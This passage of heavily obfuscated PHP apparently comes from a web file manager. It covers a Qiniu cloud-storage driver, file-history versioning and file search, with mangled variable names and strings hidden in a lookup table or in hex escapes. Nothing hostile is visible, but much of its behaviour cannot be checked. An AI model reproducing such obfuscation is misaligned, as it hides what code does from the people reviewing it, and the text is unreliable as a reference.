($Ÿ®æÀı === $Ç€äò’[12]) { break; } } if ($Ï…Éø—§) { return array($Ç€äò’[207] => $£ éÑÑ, $Ç€äò’[208] => $¦”¯ÙÌô); } return !1; } public function listAll($Ò«Ã˜¿Ñ) { $×”»Ş¥ =& $_SERVER[³·—™¤¢]; $¾ãÀ¢üÒ = $this->fileList($Ò«Ã˜¿Ñ, $×”»Ş¥[12], !0); $¤ŞÇ¾Øé = array(); foreach ($¾ãÀ¢üÒ[$×”»Ş¥[83]] as $¬âÚ¨ëÁ) { $¤ŞÇ¾Øé[$¬âÚ¨ëÁ[$×”»Ş¥[94]]] = $¬âÚ¨ëÁ[$×”»Ş¥[76]]; } foreach ($¾ãÀ¢üÒ[$×”»Ş¥[82]] as $¬âÚ¨ëÁ) { if (is_string($¬âÚ¨ëÁ)) { $¤ŞÇ¾Øé[$¬âÚ¨ëÁ] = 0; } } return $this->listAllFiles($Ò«Ã˜¿Ñ, array_keys($¤ŞÇ¾Øé), $¤ŞÇ¾Øé); } private function fileList($…Ì’™ôŒ, $Æ††Ãíç = '', $ÈÒó½å = 0) { $¯ú¼ÀÜ† =& $_SERVER[³·—™¤¢]; $…Ì’™ôŒ = trim($…Ì’™ôŒ, $¯ú¼ÀÜ†[8]); $í±‹÷Ø¥ = empty($…Ì’™ôŒ) && $…Ì’™ôŒ !== $¯ú¼ÀÜ†[197] ? $¯ú¼ÀÜ†[12] : $…Ì’™ôŒ . $¯ú¼ÀÜ†[8]; $È©ÔĞÊ = $¯ú¼ÀÜ†[12]; $àşõğÜ = 1000; $„±©×ÏŒ = $íËµõ‰à = array(); while (!0) { check_abort(); list($¶…©ì¦», $¦Ÿ¤‰™õ) = $this->bucketManager->listFiles($this->bucket, $í±‹÷Ø¥, $È©ÔĞÊ, $àşõğÜ, $Æ††Ãíç); if ($¦Ÿ¤‰™õ) { break; } $È©ÔĞÊ = array_key_exists($¯ú¼ÀÜ†[1419], $¶…©ì¦») ? $È©ÔĞÊ = $¶…©ì¦»[$¯ú¼ÀÜ†[1452]] : $¯ú¼ÀÜ†[12]; $ôË÷§ÍÂ = isset($¶…©ì¦»[$¯ú¼ÀÜ†[1453]]) ? $¶…©ì¦»[$¯ú¼ÀÜ†[1453]] : array(); $Ğ»¦˜ÄÖ = isset($¶…©ì¦»[$¯ú¼ÀÜ†[1454]]) ? $¶…©ì¦»[$¯ú¼ÀÜ†[1454]] : array(); foreach ($ôË÷§ÍÂ as $‰ÊÆ»¥·) { if ($‰ÊÆ»¥·[$¯ú¼ÀÜ†[94]] == $í±‹÷Ø¥) { continue; } $»œ¶”ŒÜ = $‰ÊÆ»¥·[$¯ú¼ÀÜ†[94]]; $–¯©ù¹ = $‰ÊÆ»¥·[$¯ú¼ÀÜ†[1450]]; $‰ÊÆ»¥·[$¯ú¼ÀÜ†[76]] = $–¯©ù¹; $Ô‹ôÕÏö = $–¯©ù¹ == 0 && substr($»œ¶”ŒÜ, strlen($»œ¶”ŒÜ) - 1, 1) == $¯ú¼ÀÜ†[8] ? !0 : !1; $this->cacheMethodInfoSet($»œ¶”ŒÜ, $Ô‹ôÕÏö, $‰ÊÆ»¥·); if ($Ô‹ôÕÏö) { $„±©×ÏŒ[] = $»œ¶”ŒÜ; continue; } $íËµõ‰à[] = $ÈÒó½å ? $‰ÊÆ»¥· : $»œ¶”ŒÜ; } foreach ($Ğ»¦˜ÄÖ as $»œ¶”ŒÜ) { if ($»œ¶”ŒÜ == $í±‹÷Ø¥) { continue; } $„±©×ÏŒ[] = $»œ¶”ŒÜ; $this->cacheMethodInfoSet($»œ¶”ŒÜ, !0); } if ($È©ÔĞÊ === $¯ú¼ÀÜ†[12]) { break; } } $this->cacheMethodInfoSet($…Ì’™ôŒ, !0); return array($¯ú¼ÀÜ†[82] => $„±©×ÏŒ, $¯ú¼ÀÜ†[83] => $íËµõ‰à); } public function canRead($„­ã”³Ÿ) { return $this->exist($„­ã”³Ÿ) ? !0 : !1; } public function canWrite($Š•ğÖ¿œ) { return $this->exist($Š•ğÖ¿œ) ? !0 : !1; } public function getContent($¤êüè±ı) { return $this->fileSubstr($¤êüè±ı, 0, -1); } public function setContent($Å öÍ, $¨éàøêâ = '') { $ü‰ŞºÇÏ = $this->tempFile($this->pathThis($Å öÍ)); file_put_contents($ü‰ŞºÇÏ, $¨éàøêâ); if ($this->upload($Å öÍ, $ü‰ŞºÇÏ)) { $this->tempFileRemve($ü‰ŞºÇÏ); return !0; } return !1; } public function refreshUrls($œÃ—›üƒ) { $æøèı¦ =& $_SERVER[³·—™¤¢]; $§»ª„È = array(); if (is_array($œÃ—›üƒ)) { foreach ($œÃ—›üƒ as $ï«½é§Ş) { $§»ª„È[] = $this->link($ï«½é§Ş); } } else { $§»ª„È[] = $this->link($œÃ—›üƒ); } $Ÿ…êğÚ’ = new Qiniu\Cdn\CdnManager($this->auth); list($¹ºÏè¤³, $‚³¡…Úã) = $Ÿ…êğÚ’->refreshUrls($§»ª„È); if ($‚³¡…Úã) { return !1; } return $¹ºÏè¤³[$æøèı¦[1206]] == $æøèı¦[780] ? !0 : !1; } public function fileSubstr($æ¼ºº£Ú, $İÂãë†, $·åŸ‰ß¾) { $×şĞùÖ« =& $_SERVER[³·—™¤¢]; if (!($ÄÀ¥îùˆ = $this->link($æ¼ºº£Ú))) { return !1; } $÷Ó¡¢ = !1; if ($·åŸ‰ß¾ > 0) { $çÕÂäÛ = $İÂãë† + $·åŸ‰ß¾ - 1; $÷Ó¡¢ = array($×şĞùÖ«[1455] . $İÂãë† . $×şĞùÖ«[386] . $çÕÂäÛ); } $×â¾³³ = url_request($ÄÀ¥îùˆ, $×şĞùÖ«[230], !1, $÷Ó¡¢); return $×â¾³³[$×şĞùÖ«[770]] ? $×â¾³³[$×şĞùÖ«[1216]] : !1; } public function upload($ô¼Á–’ß, $Õšö¹‘, $ËÆ™ûú´ = false, $ÒõÓÂ¹à = REPEAT_REPLACE) { $õÜÑ×óˆ = new Qiniu\Storage\UploadManager(); $›”—”¶‰ = $this->auth->uploadToken($this->bucket, $ô¼Á–’ß); $®€İƒ¿› = get_file_mime(get_path_ext($Õšö¹‘)); list($÷İ”Í Ş, $•ˆ¢¬°´) = $õÜÑ×óˆ->putFile($›”—”¶‰, $ô¼Á–’ß, $Õšö¹‘, null, $®€İƒ¿›); return $•ˆ¢¬°´ ? !1 : $this->getPathOuter($ô¼Á–’ß); } public function uploadFormData($‘ñ”€Ğ›, $…”şØ÷ = 3600) { return $this->uploadToken($‘ñ”€Ğ›, $…”şØ÷); } public function multiUploadFormData($úÇ­şÖú, $Ş½à¹§š = 3600) { return $this->uploadToken($úÇ­şÖú, $Ş½à¹§š); } private function uploadToken($Ö¸¹Ô½ã, $œö¡šŸÜ = 3600) { $£ÄƒñŞ† =& $_SERVER[³·—™¤¢]; $»ôÙ­¥Ÿ = $œö¡šŸÜ; $è¾¶¾÷É = array($£ÄƒñŞ†[1456] => $£ÄƒñŞ†[1457]); $ıü…Éñª = $Ö¸¹Ô½ã; $µŠÙÅ¹Õ = $this->auth->uploadToken($this->bucket, $ıü…Éñª, $»ôÙ­¥Ÿ, $è¾¶¾÷É, !0); $ÅØ°ı† = empty($this->region) || $this->region == $£ÄƒñŞ†[1458] ? $£ÄƒñŞ†[12] : $£ÄƒñŞ†[386] . $this->region; $ÉŸœ´Ãƒ = http_type() . "\x3a\x2f\57\165\x70\154\x6f\141\144{$ÅØ°ı†}\56\x71\151\156\x69\165\160\x2e\x63\x6f\155\57"; return array($£ÄƒñŞ†[1459] => $µŠÙÅ¹Õ, $£ÄƒñŞ†[1460] => $ÉŸœ´Ãƒ); } public function download($¤‘ÙÁ­À, $ Ô®æ¼­) { $ĞòÅµæß = IO::getPathInner(IO::mkfile($ Ô®æ¼­)); if (!($²—Ë²Ğ = $this->link($¤‘ÙÁ­À))) { return !1; } $»÷¢‰Æñ = 0; $­«¥²Áı = 1024 * 200; $Æ˜±©´ = fopen($ĞòÅµæß, $_SERVER[³·—™¤¢][1461]); while (!0) { $Ş–úœ = $this->fileSubstr($¤‘ÙÁ­À, $»÷¢‰Æñ, $­«¥²Áı); if ($Ş–úœ === !1) { return !1; } fwrite($Æ˜±©´, $Ş–úœ); $»÷¢‰Æñ += $­«¥²Áı; if (strlen($Ş–úœ) < $­«¥²Áı) { break; } } fclose($Æ˜±©´); return $ Ô®æ¼­; } public function link($´í‘ô¡–, $é€÷„—· = '') { if (!$this->isFile($´í‘ô¡–)) { return !1; } $‘ÍÉ÷§Å = $this->getHost() . $_SERVER[³·—™¤¢][8] . $this->pathEncode($´í‘ô¡–) . $é€÷„—·; return $this->auth->privateDownloadUrl($‘ÍÉ÷§Å, 3600 * 12); } public function fileOut($ô¿šõ×Ä, $Äò±â = false, $¦ø°Ë„· = false, $Ğ¿ıÔæ = '') { $Û‡Ùıò =& $_SERVER[³·—™¤¢]; if ($this->isFileOutServer()) { return $this->fileOutServer($ô¿šõ×Ä, $Äò±â, $¦ø°Ë„·, $Ğ¿ıÔæ); } if (!$¦ø°Ë„·) { $¦ø°Ë„· = $this->pathThis($ô¿šõ×Ä); } $éüş¬±µ = $Äò±â ? $Û‡Ùıò[1462] . rawurlencode($¦ø°Ë„·) : $Û‡Ùıò[12]; $ÓòÎ¾ = $this->link($ô¿šõ×Ä, $éüş¬±µ); $this->fileOutLink($ÓòÎ¾); } public function fileOutServer($½¥Ûíãç, $³äÓ’ŞÀ = false, $×œÏŸÒñ = false, $‡Ü×“Î¾ = '') { parent::fileOut($½¥Ûíãç, $³äÓ’ŞÀ, $×œÏŸÒñ, $‡Ü×“Î¾); } public function fileOutImage($§Îˆ§, $úùÙ™£ = 250) { $½‹å¼ = $this->link($§Îˆ§, $_SERVER[³·—™¤¢][1463] . $úùÙ™£); $this->fileOutLink($½‹å¼); } public function fileOutImageServer($áúŸÉêñ, $ú Á¢åº = 250) { parent::fileOutImage($áúŸÉêñ, $ú Á¢åº); } public function hashMd5($›èî˜Ê) { $®¦±• =& $_SERVER[³·—™¤¢]; $àâµïÂ = $this->objectMeta($›èî˜Ê); return isset($àâµïÂ[$®¦±•[212]]) ? $àâµïÂ[$®¦±•[212]] : !1; $ÄœÇ¬ = $this->link($›èî˜Ê, $®¦±•[1464]); } public function size($á¨ÑÌğ¸) { $°Ç²áäƒ = $this->objectMeta($á¨ÑÌğ¸); return $°Ç²áäƒ ? $°Ç²áäƒ[$_SERVER[³·—™¤¢][76]] : 0; } public function info($’â¶‘õï) { if ($this->isFolder($’â¶‘õï)) { return $this->folderInfo($’â¶‘õï); } else { if ($this->isFile($’â¶‘õï)) { return $this->fileInfo($’â¶‘õï); } } return !1; } public function exist($ğ˜İÍÊ­) { return $this->isFile($ğ˜İÍÊ­) || $this->isFolder($ğ˜İÍÊ­); } public function isFile($‡“èÉÕš) { return !$this->isFolder($‡“èÉÕš) && $this->objectMeta($‡“èÉÕš); } public function isFolder($ï½ç®æ¸) { return $this->cacheMethod($_SERVER[³·—™¤¢][165], $ï½ç®æ¸); } protected function objectMeta($Ç‹´˜óˆ) { return $this->cacheMethod($_SERVER[³·—™¤¢][167], $Ç‹´˜óˆ); } protected function _objectMeta($İª€’ö) { $ÔĞÏœÖœ =& $_SERVER[³·—™¤¢]; list($Í×ßÖ©”, $†¡¦¨¬) = $this->bucketManager->stat($this->bucket, $İª€’ö); if ($Í×ßÖ©”) { $Í×ßÖ©”[$ÔĞÏœÖœ[76]] = intval($Í×ßÖ©”[$ÔĞÏœÖœ[1450]]); } return $Í×ßÖ©”; } protected function _isFolder($˜Ù¹£ Ì) { $¹¸¨«ƒµ =& $_SERVER[³·—™¤¢]; if ($˜Ù¹£ Ì == $¹¸¨«ƒµ[12] || $˜Ù¹£ Ì == $¹¸¨«ƒµ[8]) { return !0; } list($²¼¥ì, $¯™Ÿ¾ùº) = $this->bucketManager->listFiles($this->bucket, trim($˜Ù¹£ Ì, $¹¸¨«ƒµ[8]) . $¹¸¨«ƒµ[8], $¹¸¨«ƒµ[12], 1, $¹¸¨«ƒµ[8]); return !empty($²¼¥ì[$¹¸¨«ƒµ[1453]]) || !empty($²¼¥ì[$¹¸¨«ƒµ[1454]]) ? !0 : !1; } } goto fòØœ•±•´; CÏŞòó¨â¤: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\162\x63\145\x5f\150\151\163\164\x6f\x72\x79"; public function historyCount($”‚íş£Æ) { $ĞÔÊóâÙ =& $_SERVER[³·—™¤¢]; if (!$”‚íş£Æ) { return array(); } if (is_string($”‚íş£Æ) || is_int($”‚íş£Æ)) { $”‚íş£Æ = array($”‚íş£Æ); } $Ôú¡‹¨Û = array($ĞÔÊóâÙ[402], $ĞÔÊóâÙ[1885] => $ĞÔÊóâÙ[500]); $ìôşì¿ = array($ĞÔÊóâÙ[402] => array($ĞÔÊóâÙ[7], $”‚íş£Æ)); $ºÅ¬õÆâ = $this->field($Ôú¡‹¨Û)->where($ìôşì¿)->group($ĞÔÊóâÙ[402])->select(); return array_to_keyvalue($ºÅ¬õÆâ, $ĞÔÊóâÙ[402], $ĞÔÊóâÙ[500]); } public function addHistory($Š„ûæ¿Á, $è¢‚§Àµ = '') { $ä‰ûÕš =& $_SERVER[³·—™¤¢]; $¹—ÄåîÓ = array($ä‰ûÕš[417] => $Š„ûæ¿Á[$ä‰ûÕš[402]], $ä‰ûÕš[1671] => isset($Š„ûæ¿Á[$ä‰ûÕš[456]]) ? $Š„ûæ¿Á[$ä‰ûÕš[456]] : $Š„ûæ¿Á[$ä‰ûÕš[454]], $ä‰ûÕš[469] => $Š„ûæ¿Á[$ä‰ûÕš[468]], $ä‰ûÕš[585] => $Š„ûæ¿Á[$ä‰ûÕš[76]], $ä‰ûÕš[2091] => $è¢‚§Àµ); if ($GLOBALS[$ä‰ûÕš[6]][$ä‰ûÕš[89]][$ä‰ûÕš[1232]] >= 1) { $this->historyAutoClear($¹—ÄåîÓ[$ä‰ûÕš[402]]); $this->add($¹—ÄåîÓ); } Hook::trigger($ä‰ûÕš[2092], $¹—ÄåîÓ); Model($ä‰ûÕš[2093])->eventFileEdit($Š„ûæ¿Á[$ä‰ûÕš[402]]); } private function historyAutoClear($Ûö›¶Ï¯) { $ÓÓó¡–Ä =& $_SERVER[³·—™¤¢]; $ûâ‡±ê = Model($ÓÓó¡–Ä[790])->get($ÓÓó¡–Ä[1254]); $‚şÃ˜‘ù = $GLOBALS[$ÓÓó¡–Ä[6]][$ÓÓó¡–Ä[89]][$ÓÓó¡–Ä[1232]]; $¿¬×¿­Í = $ûâ‡±ê == $ÓÓó¡–Ä[1255] ? min(5, $‚şÃ˜‘ù) : $‚şÃ˜‘ù; $¿¬×¿­Í = $¿¬×¿­Í <= 0 ? 0 : $¿¬×¿­Í - 1; if ($¿¬×¿­Í >= 500) { return; } $Æ¿ºëÜ— = array($ÓÓó¡–Ä[417] => $Ûö›¶Ï¯); $ÁÎ”ø = $this->field($ÓÓó¡–Ä[2094])->where($Æ¿ºëÜ—)->order($ÓÓó¡–Ä[2088])->select(); if (!$ÁÎ”ø || $¿¬×¿­Í >= count($ÁÎ”ø)) { return; } $»†ˆŞ˜ˆ = array_to_keyvalue($ÁÎ”ø, $ÓÓó¡–Ä[12], $ÓÓó¡–Ä[399]); $»†ˆŞ˜ˆ = array_slice($»†ˆŞ˜ˆ, $¿¬×¿­Í); $Á Ë×¥ä = array_to_keyvalue($ÁÎ”ø, $ÓÓó¡–Ä[12], $ÓÓó¡–Ä[468]); $Á Ë×¥ä = array_slice($Á Ë×¥ä, $¿¬×¿­Í); if (!$»†ˆŞ˜ˆ || !$Á Ë×¥ä) { return; } $Æ¿ºëÜ— = array($ÓÓó¡–Ä[419] => array($ÓÓó¡–Ä[7], $»†ˆŞ˜ˆ)); $this->where($Æ¿ºëÜ—)->delete(); Model($ÓÓó¡–Ä[471])->remove($Á Ë×¥ä); } public function listData($¾Óˆì†Ì) { $üË¶òºô =& $_SERVER[³·—™¤¢]; $Ï«Ÿ›› = array($üË¶òºô[417] => $¾Óˆì†Ì); $óäüŒÜ = $üË¶òºô[2095]; $ËŒÆ‰Šö = $this->field($óäüŒÜ)->where($Ï«Ÿ››)->order($üË¶òºô[2088])->selectPage(); $this->_listAppendUser($ËŒÆ‰Šö[$üË¶òºô[369]]); $ï€›£Â = Model($üË¶òºô[790])->get($üË¶òºô[1254]); $ºÓ­©æş = 5; if ($ï€›£Â == $üË¶òºô[1255]) { $ËŒÆ‰Šö[$üË¶òºô[369]] = array_slice($ËŒÆ‰Šö[$üË¶òºô[369]], 0, $ºÓ­©æş); $ËŒÆ‰Šö[$üË¶òºô[366]] = array($üË¶òºô[2096] => 1, $üË¶òºô[2097] => 20, $üË¶òºô[2098] => 1, $üË¶òºô[2099] => count($ËŒÆ‰Šö[$üË¶òºô[369]])); } return $ËŒÆ‰Šö; } protected function _listAppendUser(&$åÍØĞğ›) { $î¾…±Úº =& $_SERVER[³·—™¤¢]; $ù”’õ¡¿ = array_to_keyvalue($åÍØĞğ›, $î¾…±Úº[12], $î¾…±Úº[1680]); $½ÅÈÔ = Model($î¾…±Úº[535])->userListInfo($ù”’õ¡¿); foreach ($åÍØĞğ› as &$Ëâ’Šæ’) { $‹ÆâŒĞ´ = $Ëâ’Šæ’[$î¾…±Úº[1680]]; $Ëâ’Šæ’[$î¾…±Úº[454]] = $½ÅÈÔ[$‹ÆâŒĞ´] ? $½ÅÈÔ[$‹ÆâŒĞ´] : !1; } unset($Ëâ’Šæ’); } public function fileInfo($¹êÉ­µ) { $¥Ğ ¨—û =& $_SERVER[³·—™¤¢]; $†îÕ‹ú = $this->tablePrefix; $À¥ŸŒõÍ = "{$†îÕ‹ú}\151\157\x5f\146\x69\x6c\x65\40\146\151\154\145\163\x20\x6f\156\x20\146\151\x6c\x65\x73\x2e\x66\151\x6c\145\x49\104\x20\75\x20\x68\151\x73\x74\x6f\162\x79\56\x66\x69\x6c\x65\111\104"; return $this->alias($¥Ğ ¨—û[2100])->where(array($¥Ğ ¨—û[419] => $¹êÉ­µ))->join($À¥ŸŒõÍ, $¥Ğ ¨—û[2101])->find(); } public function removeItem($Åş¶ç£) { $«´Ë¨ =& $_SERVER[³·—™¤¢]; $“…¨—Šà = array($«´Ë¨[419] => $Åş¶ç£); $‡üŠ¶Ó = $this->where($“…¨—Šà)->find(); if ($‡üŠ¶Ó) { $ÜÒğ×íë = $this->where($“…¨—Šà)->delete(); Model($«´Ë¨[471])->remove($‡üŠ¶Ó[$«´Ë¨[468]]); return $ÜÒğ×íë; } return !1; } public function removeBySource($î‹ƒâ„Ş) { $áóè¹ç¯ =& $_SERVER[³·—™¤¢]; if (!$î‹ƒâ„Ş) { return !1; } if (!is_array($î‹ƒâ„Ş)) { $î‹ƒâ„Ş = array($î‹ƒâ„Ş); } $¢îô—İ = array($áóè¹ç¯[417] => array($áóè¹ç¯[7], $î‹ƒâ„Ş)); $Ê ¿èÏû = $this->field($áóè¹ç¯[469])->where($¢îô—İ)->select(); if ($Ê ¿èÏû) { $this->where($¢îô—İ)->delete(); $Ê±×âöœ = array_to_keyvalue($Ê ¿èÏû, $áóè¹ç¯[12], $áóè¹ç¯[468]); Model($áóè¹ç¯[471])->remove($Ê±×âöœ); } return !0; } public function setDetail($Ñôî­”, $¸º ©õ¨) { $Ñ†ÚÏ˜ò =& $_SERVER[³·—™¤¢]; return $this->where(array($Ñ†ÚÏ˜ò[419] => $Ñôî­”))->save(array($Ñ†ÚÏ˜ò[2091] => $¸º ©õ¨)); } public function rollbackToItem($ˆşª¤Öú, $µı½·ˆî) { $ï›Îè  =& $_SERVER[³·—™¤¢]; $Ì›Å“Ù‘ = Model($ï›Îè [845])->sourceInfo($ˆşª¤Öú); $this->addHistory($Ì›Å“Ù‘, LNG($ï›Îè [2102])); $•Å•”§ = $this->find($µı½·ˆî); $İ©€“ƒª = array($ï›Îè [468] => $•Å•”§[$ï›Îè [468]], $ï›Îè [76] => $•Å•”§[$ï›Îè [76]], $ï›Îè [85] => time(), $ï›Îè [456] => USER_ID); Model($ï›Îè [845])->where(array($ï›Îè [402] => $ˆşª¤Öú))->save($İ©€“ƒª); return $this->where(array($ï›Îè [419] => $µı½·ˆî))->delete(); } public function clearSame($‚İ®ò¸·) { $ÆƒŸ©’ =& $_SERVER[³·—™¤¢]; $š¨åØˆ = $this->listData($‚İ®ò¸·); $©ÔŞ§ˆ = array_to_keyvalue_group($š¨åØˆ, $ÆƒŸ©’[468]); $·íê£¨¨ = array(); $…é‘—¦¨ = array(); foreach ($©ÔŞ§ˆ as $”ñ¥–¨) { if (!$”ñ¥–¨ || count($”ñ¥–¨) <= 1) { continue; } foreach ($”ñ¥–¨ as $²ã¡»˜¥) { $·íê£¨¨[] = $²ã¡»˜¥[$ÆƒŸ©’[468]]; $…é‘—¦¨[] = $²ã¡»˜¥[$ÆƒŸ©’[399]]; } } if (!$…é‘—¦¨) { return; } $this->where(array($ÆƒŸ©’[399] => array($ÆƒŸ©’[7], $…é‘—¦¨)))->delete(); Model($ÆƒŸ©’[471])->remove($·íê£¨¨); } public function userSpace() { $«î¼¤Ñù =& $_SERVER[³·—™¤¢]; $—â”¬¹Ã = $this->tablePrefix; $²¯ì²Ä• = array($«î¼¤Ñù[1671] => USER_ID); $¤ª˜Š­ = "{$—â”¬¹Ã}\x69\157\x5f\146\x69\154\x65\40\x66\x69\x6c\x65\x73\x20\157\156\x20\146\x69\x6c\145\x73\56\146\151\x6c\x65\111\x44\x20\75\x20\x68\x69\163\164\157\162\171\56\146\x69\x6c\x65\111\104"; return $this->alias($«î¼¤Ñù[2100])->where($²¯ì²Ä•)->join($¤ª˜Š­, $«î¼¤Ñù[2101])->sum($«î¼¤Ñù[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Ò¬ß€™’) { $  Şå =& $_SERVER[³·—™¤¢]; $»»Õ¾í… = KodIO::fileTypeList(); $Ú—ÈÔŞ¶ = $»»Õ¾í…[$Ò¬ß€™’]; if (!$Ú—ÈÔŞ¶) { return array(); } $øÈçŒÜÍ = $Ú—ÈÔŞ¶[$  Şå[174]]; $¨Ó»¨Ï™ = $  Şå[7]; if (!$Ú—ÈÔŞ¶[$  Şå[174]]) { $àÂ—ª¼ = array_to_keyvalue($»»Õ¾í…, $  Şå[12], $  Şå[174]); $øÈçŒÜÍ = implode($  Şå[50], $àÂ—ª¼); $¨Ó»¨Ï™ = $  Şå[2103]; } $ÓÕè¼Õ = explode($  Şå[50], trim($øÈçŒÜÍ, $  Şå[50])); return array($¨Ó»¨Ï™, $ÓÕè¼Õ); } public function listPathType($şªÄ°Ú) { $ñ¤èØ ù =& $_SERVER[³·—™¤¢]; $©“Ò¶ËÇ = $this->fileTypeWhere($şªÄ°Ú); if (!$©“Ò¶ËÇ) { return array(); } $õËÅÈşÚ = USER_ID; $ÌĞŸÃ±² = Model($ñ¤èØ ù[535])->getInfo($õËÅÈşÚ); $Ó¯ı‰›Ö = array($ñ¤èØ ù[586] => SourceModel::TYPE_USER, $ñ¤èØ ù[521] => array($ñ¤èØ ù[550], $ñ¤èØ ù[531] . $ÌĞŸÃ±²[$ñ¤èØ ù[86]][$ñ¤èØ ù[402]] . $ñ¤èØ ù[551]), $ñ¤èØ ù[587] => $õËÅÈşÚ, $ñ¤èØ ù[583] => 0, $ñ¤èØ ù[584] => $©“Ò¶ËÇ); return $this->listSource($Ó¯ı‰›Ö); } public function listSearch($‹¬™â³İ, $÷ª—³Úº = 300) { $ƒæÒ«îô =& $_SERVER[³·—™¤¢]; if (isset($‹¬™â³İ[$ƒæÒ«îô[1946]]) && $‹¬™â³İ[$ƒæÒ«îô[1946]]) { $‹¬™â³İ[$ƒæÒ«îô[1946]] = str_replace($ƒæÒ«îô[384], $ƒæÒ«îô[2104], trim($‹¬™â³İ[$ƒæÒ«îô[1946]])); } $„Ğ¹ù¡Ï = $this->_parseSearchWhere($‹¬™â³İ); if (!isset($„Ğ¹ù¡Ï[$ƒæÒ«îô[431]])) { $„Ğ¹ù¡Ï[$ƒæÒ«îô[431]] = 0; } $á§Œ¯£¬ = $ƒæÒ«îô[2105]; $Ëİï‹™Æ = $„Ğ¹ù¡Ï; $í¼İò”× = $á§Œ¯£¬; $this->_listSearchBindPinyin($‹¬™â³İ, $„Ğ¹ù¡Ï, $á§Œ¯£¬); $this->alias($ƒæÒ«îô[446])->_makeOrder(); $„Ğ¹ù¡Ï = $this->parseWhereLike($„Ğ¹ù¡Ï); $ìÍˆÙô´ = $this->distinct(!0)->field($á§Œ¯£¬)->where($„Ğ¹ù¡Ï)->selectPage($÷ª—³Úº); if ($GLOBALS[$ƒæÒ«îô[6]][$ƒæÒ«îô[381]][$ƒæÒ«îô[382]] && Input::check($‹¬™â³İ[$ƒæÒ«îô[1946]], $ƒæÒ«îô[593]) && $ìÍˆÙô´[$ƒæÒ«îô[366]][$ƒæÒ«îô[353]] == 1 && $ìÍˆÙô´[$ƒæÒ«îô[366]][$ƒæÒ«îô[367]] == 0) { $ìÍˆÙô´ = $this->distinct(!0)->field($á§Œ¯£¬)->where($Ëİï‹™Æ)->limit(1000)->select(); $ìÍˆÙô´ = array_page_split($ìÍˆÙô´, !1, $÷ª—³Úº); } $this->_listSearchFileContent($ìÍˆÙô´, $‹¬™â³İ, $í¼İò”×, $Ëİï‹™Æ); $this->_listSearchDesc($ìÍˆÙô´, $‹¬™â³İ, $í¼İò”×); $this->_listSearchTag($ìÍˆÙô´, $‹¬™â³İ, $í¼İò”×); $this->_listSearchGroupTag($ìÍˆÙô´, $‹¬™â³İ, $í¼İò”×); $this->_listDataApply($ìÍˆÙô´[$ƒæÒ«îô[369]]); $this->_listMake($ìÍˆÙô´); return $ìÍˆÙô´; } private function _listSearchFileContent(&$şêè±ˆ, $·ŞÒÁ’Õ, $É¿Ú†, $Ú ·Ä«) { $àŒÁªà =& $_SERVER[³·—™¤¢]; if (!$·ŞÒÁ’Õ[$àŒÁªà[1946]] || $şêè±ˆ[$àŒÁªà[366]][$àŒÁªà[353]] > 1) { return; } if (!isset($Ú ·Ä«[$àŒÁªà[32]]) || !is_array($·ŞÒÁ’Õ[$àŒÁªà[468]])) { return; } $Ú ·Ä«[$àŒÁªà[468]] = array($àŒÁªà[7], $·ŞÒÁ’Õ[$àŒÁªà[468]]); unset($Ú ·Ä«[$àŒÁªà[32]]); unset($·ŞÒÁ’Õ[$àŒÁªà[468]]); $ÏŠ¹ó = $this->field($É¿Ú†)->where($Ú ·Ä«)->limit($àŒÁªà[2106])->select(); if (!$ÏŠ¹ó || count($ÏŠ¹ó) == 0) { return; } $şêè±ˆ[$àŒÁªà[369]] = array_merge($ÏŠ¹ó, $şêè±ˆ[$àŒÁªà[369]]); $şêè±ˆ[$àŒÁªà[366]][$àŒÁªà[367]] += count($ÏŠ¹ó); } private function _listSearchTag(&$ù—¿±ø, $¿¯£”ş„, $©«Ò–šß) { $ßÈÆÙëâ =& $_SERVER[³·—™¤¢]; if (!$¿¯£”ş„[$ßÈÆÙëâ[1946]] || $ù—¿±ø[$ßÈÆÙëâ[366]][$ßÈÆÙëâ[353]] > 1) { return; } $—ÆĞùÂŠ = Model($ßÈÆÙëâ[2107])->listData(); $€’°ŞëÛ = array(); $¸”Ï…É¢ = $¿¯£”ş„[$ßÈÆÙëâ[1946]]; foreach ($—ÆĞùÂŠ as $Èü´¿‰…) { $©Ï’ş‘ = $Èü´¿‰…[$ßÈÆÙëâ[32]]; $èºÎÕí€ = str_replace($ßÈÆÙëâ[53], $ßÈÆÙëâ[12], Pinyin::get($©Ï’ş‘)); if (stripos($©Ï’ş‘, $¸”Ï…É¢) !== !1 || stripos($èºÎÕí€, $¸”Ï…É¢) !== !1) { $€’°ŞëÛ[] = $Èü´¿‰…[$ßÈÆÙëâ[399]]; } } if (!$€’°ŞëÛ) { return; } $Çû‡¢Ïí = array($ßÈÆÙëâ[426] => array($ßÈÆÙëâ[7], $€’°ŞëÛ), $ßÈÆÙëâ[1680] => USER_ID); $ÕŞ³Í˜§ = Model($ßÈÆÙëâ[428])->field($ßÈÆÙëâ[84])->where($Çû‡¢Ïí)->select(); $ÕŞ³Í˜§ = array_to_keyvalue($ÕŞ³Í˜§, $ßÈÆÙëâ[12], $ßÈÆÙëâ[84]); $ ‡¶‹ğ = array_unique($ÕŞ³Í˜§); $this->_listSearchMerge($ù—¿±ø, $¿¯£”ş„, $©«Ò–šß, $ ‡¶‹ğ); } private function _listSearchDesc(&$äáÍ¯ô¢, $ùßÆ–ï², $‹÷€±ù) { $Ï¬ßø©Ò =& $_SERVER[³·—™¤¢]; if (!$ùßÆ–ï²[$Ï¬ßø©Ò[1946]] || $äáÍ¯ô¢[$Ï¬ßø©Ò[366]][$Ï¬ßø©Ò[353]] > 1) { return; } $ÉÒ¼¬Š™ = array($Ï¬ßø©Ò[94] => $Ï¬ßø©Ò[453], $Ï¬ßø©Ò[374] => array($Ï¬ßø©Ò[383], $Ï¬ßø©Ò[1948] . $ùßÆ–ï²[$Ï¬ßø©Ò[1946]] . $Ï¬ßø©Ò[1948])); $¡º‰²ƒ  = !1; if ($¡º‰²ƒ ) { $Íß¬Â‹æ = $this->listSearchChildren($ùßÆ–ï²[$Ï¬ßø©Ò[432]]); $Íß¬Â‹æ = array_unique($Íß¬Â‹æ); if (!$Íß¬Â‹æ) { return; } $ÉÒ¼¬Š™[$Ï¬ßø©Ò[402]] = array($Ï¬ßø©Ò[7], $Íß¬Â‹æ); } $ºø¤ìåÊ = Model($Ï¬ßø©Ò[569])->field($Ï¬ßø©Ò[402])->where($ÉÒ¼¬Š™)->limit(5000)->select(); $¢ü…¾Ç = array_to_keyvalue($ºø¤ìåÊ, 